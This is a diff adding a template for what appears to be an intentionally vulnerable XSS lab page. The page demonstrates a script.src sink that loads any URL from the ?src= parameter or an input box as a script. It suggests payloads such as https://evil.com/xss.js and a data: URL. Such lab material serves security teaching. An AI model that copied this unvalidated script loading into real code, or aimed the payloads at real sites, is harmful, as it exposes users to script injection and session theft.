@@ -1,0 +1,30 @@
+{% extends "base.html" %}
+{% block title %}script.src Sink{% endblock %}
+{% block content %}
+<a class="back" href="/">&larr; Back</a>
+<h2><span class="badge js">JS</span> script.src</h2>
+<div class="card">
+<p><b>Source:</b> URL query <code>?src=</code> or input</p>
+<p><b>Sink:</b> dynamically creates <code>&lt;script src=userInput&gt;</code></p>
+<pre>Try: ?src=https://evil.com/xss.js (or data:text/javascript,alert('script.src'))</pre>
+<input id="inp" placeholder="Enter script URL...">
+<button onclick="trigger()">Load script</button>
+</div>
+<script>
+function trigger() {
+    var val = document.getElementById('inp').value ||
+              new URLSearchParams(location.search).get('src');
+    var s = document.createElement('script');
+    s.src = val;
+    document.body.appendChild(s);
+}
+(function() {
+    var val = new URLSearchParams(location.search).get('src');
+    if (val) {
+        var s = document.createElement('script');
+        s.src = val;
+        document.body.appendChild(s);
+    }
+})();
+</script>
+{% endblock %}
